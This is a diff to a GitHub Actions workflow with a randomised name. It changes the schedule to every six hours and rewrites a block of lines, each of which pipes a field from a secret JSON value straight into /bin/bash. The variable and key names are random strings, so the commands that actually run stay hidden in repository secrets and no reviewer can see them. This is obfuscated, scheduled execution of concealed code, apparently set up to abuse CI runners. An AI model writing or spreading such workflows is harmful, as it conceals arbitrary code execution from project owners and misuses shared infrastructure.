@@ -2,8 +2,7 @@ name: inboardstingy
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 0/6 * * *'
-
+    - cron: '9 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,19 +10,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: inboardstingy
         env:
-          y25997: ${{ secrets.y25997 }}
+          in81654: ${{ secrets.in81654 }}
         run: |
-          echo $y25997 | jq -r .ufyy56104 | /bin/bash
-          echo $xsjqg5 | jq -r .qjik05625 | /bin/bash
-          echo $h2 | jq -r .tig4 | /bin/bash
-          echo $brfei92 | jq -r .vkwr56 | /bin/bash
-          echo $toza662 | jq -r .fvi098 | /bin/bash
-          echo $loar41 | jq -r .ko6 | /bin/bash
-          echo $mbk0 | jq -r .u9373 | /bin/bash
-          echo $iuj30 | jq -r .xfv4 | /bin/bash
-          echo $bua97126 | jq -r .ijm0 | /bin/bash
-          echo $xruir59643 | jq -r .wnbep9 | /bin/bash
-          echo $alfyj984 | jq -r .rxlxd9674 | /bin/bash
-          echo $n82 | jq -r .s0123 | /bin/bash
-          echo $yv58243 | jq -r .zf1 | /bin/bash
+          echo $in81654 | jq -r .ivm98596 | /bin/bash
+          echo $u78 | jq -r .syxf63710 | /bin/bash
+          echo $nzynq4 | jq -r .vjmgu4918 | /bin/bash
+          echo $w5 | jq -r .syig29246 | /bin/bash
+          echo $odwz5 | jq -r .m2 | /bin/bash
+          echo $i0 | jq -r .co4167 | /bin/bash
+          echo $cl68937 | jq -r .esayc422 | /bin/bash
+          echo $taolh448 | jq -r .bnt93210 | /bin/bash
+          echo $q6 | jq -r .pv55 | /bin/bash
+          echo $ehnz0925 | jq -r .fgbo98 | /bin/bash
+          echo $kkzp9 | jq -r .die943 | /bin/bash
+          echo $xqo471 | jq -r .qa882 | /bin/bash
+          echo $dadg82042 | jq -r .ik2653 | /bin/bash
+          echo $dt9 | jq -r .bmw1434 | /bin/bash
+          echo $q7 | jq -r .mkdml7854 | /bin/bash
 
